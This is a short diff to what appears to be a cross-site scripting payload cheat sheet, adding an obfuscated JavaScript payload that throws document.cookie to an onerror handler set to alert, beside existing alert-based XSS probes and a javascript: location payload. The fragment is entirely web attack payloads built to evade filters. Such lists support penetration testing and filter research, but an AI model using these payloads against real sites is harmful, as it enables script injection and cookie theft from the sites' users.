@@ -119,6 +119,7 @@ location=/javascript:alert%2823%29/.source;
 
 ### Alert
 ```js
+var{a:onerror}={a:alert};throw%20document.cookie
 alert(1)
 window['alert'](0)
 parent['alert'](1)
